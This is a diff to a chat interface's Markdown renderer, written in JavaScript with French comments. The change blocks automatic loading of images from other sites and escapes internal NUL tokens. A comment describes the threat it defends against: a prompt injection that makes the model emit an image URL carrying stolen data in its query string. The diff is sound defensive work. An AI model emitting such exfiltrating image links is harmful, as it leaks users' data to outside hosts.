@@ -1,3 +1,4 @@
+// @ts-check
 /*
   Le rendu Markdown du chat : un sous-ensemble de CommonMark + GFM, écrit
   ici pour garder la page sans dépendance ni étape de compilation.
@@ -5,7 +6,12 @@
   SÛR PAR CONSTRUCTION : tout le texte est échappé d'abord, puis seules
   des balises connues sont produites — aucun HTML du modèle ne passe.
   Les liens et images n'acceptent que http(s), mailto et les chemins du
-  proxy (/v1/files/… : les fichiers rendus par les outils).
+  proxy (/v1/files/… : les fichiers rendus par les outils). Une image
+  d'un AUTRE site n'est pas chargée d'office : sa simple requête suffirait
+  à exfiltrer ce qu'une injection de prompt aurait mis dans l'URL
+  (`![](https://site/?q=<données>)`). Elle devient un bouton
+  `.md-img-load` (data-src) que la page remplace par l'image au clic.
+  Le caractère NUL, qui sert de jeton interne, est retiré à l'entrée.
 
   Couvert : titres, paragraphes (un saut de ligne simple reste un saut de
   ligne, comme dans toute interface de chat), listes à puces et
@@ -23,6 +29,7 @@ export const Markdown = (() => {
   // URL déjà ÉCHAPPÉE (le texte l'est avant toute analyse).
   function safeUrl(u) {
     u = u.trim();
+    if (u.includes("\u0000")) return null;   // un jeton : jamais dans une URL
     if (/^(https?:|mailto:)/i.test(u) || /^\/(?!\/)/.test(u) || /^#/.test(u)) {
       return u;
     }
@@ -33,6 +40,10 @@ export const Markdown = (() => {
   function inline(src) {
     const held = [];
     const hold = (html) => "\u0000" + (held.push(html) - 1) + "\u0000";
+    // Rend un fragment : ses jetons, et ceux des fragments qu'ils
+    // contiennent (un lien dont le texte porte du code). Un fragment ne
+    // contient que des jetons PLUS ANCIENS que lui : la récursion finit.
+    const restore = (str) => str.replace(/\u0000(\d+)\u0000/g, (_, i) => restore(held[+i]));
     // Le code en ligne d'abord : rien de ce qu'il contient n'est interprété.
     let s = src.replace(/(`+)([\s\S]*?[^`])\1(?!`)/g,
       (_, __, code) => hold("<code>" + esc(code.replace(/^ (.*) $/, "$1")) + "</code>"));
@@ -41,8 +52,15 @@ export const Markdown = (() => {
     s = s.replace(/!\[([^\]]*)\]\(\s*([^)\s]+)(?:\s+&quot;[^]*?&quot;)?\s*\)/g,
       (all, alt, url) => {
         const ok = safeUrl(url);
-        return ok ? hold(`<a href="${ok}" target="_blank" rel="noopener noreferrer">`
-          + `<img src="${ok}" alt="${alt}" loading="lazy"></a>`) : all;
+        if (!ok) return all;
+        alt = alt.replace(/\u0000\d+\u0000/g, "");   // un attribut : pas de balise
+        if (/^https?:/i.test(ok)) {
+          const host = esc((ok.match(/^https?:\/\/([^/?#]*)/i) || ["", ""])[1]);
+          return hold(`<button type="button" class="md-img-load" data-src="${ok}" data-alt="${alt}"`
+            + ` title="${ok}">Afficher l'image${alt ? " « " + alt + " »" : ""} (${host})</button>`);
+        }
+        return hold(`<a href="${ok}" target="_blank" rel="noopener noreferrer">`
+          + `<img src="${ok}" alt="${alt}" loading="lazy"></a>`);
       });
     s = s.replace(/\[([^\]]+)\]\(\s*([^)\s]+)(?:\s+&quot;[^]*?&quot;)?\s*\)/g,
       (all, text, url) => {
@@ -51,15 +69,14 @@ export const Markdown = (() => {
           + emphasis(text) + "</a>") : all;
       });
     // URL nues ; la ponctuation finale reste hors du lien.
-    s = s.replace(/\bhttps?:\/\/[^\s<]*[^\s<.,:;!?)\]'"*_~]/g, (url) => {
+    s = s.replace(/\bhttps?:\/\/[^\s<\u0000]*[^\s<\u0000.,:;!?)\]'"*_~]/g, (url) => {
       // `&quot;` et `&#39;` finaux viennent de guillemets : hors du lien.
       const m = url.match(/^(.*?)((?:&quot;|&#39;|&gt;)+.*)?$/);
       const href = m[1], rest = m[2] || "";
       return hold(`<a href="${href}" target="_blank" rel="noopener noreferrer">${href}</a>`) + rest;
     });
     s = emphasis(s);
-    return s.replace(/\u0000(\d+)\u0000/g, (_, i) => held[+i])
-      .replace(/\u0000(\d+)\u0000/g, (_, i) => held[+i]);
+    return restore(s);
   }
 
   function emphasis(s) {
@@ -238,7 +255,7 @@ export const Markdown = (() => {
 
   function render(text) {
     if (!text) return "";
-    return blocks(String(text).replace(/\r\n?/g, "\n").split("\n")).join("");
+    return blocks(String(text).replace(/\u0000/g, "\uFFFD").replace(/\r\n?/g, "\n").split("\n")).join("");
   }
 
   return { render, escape: esc };
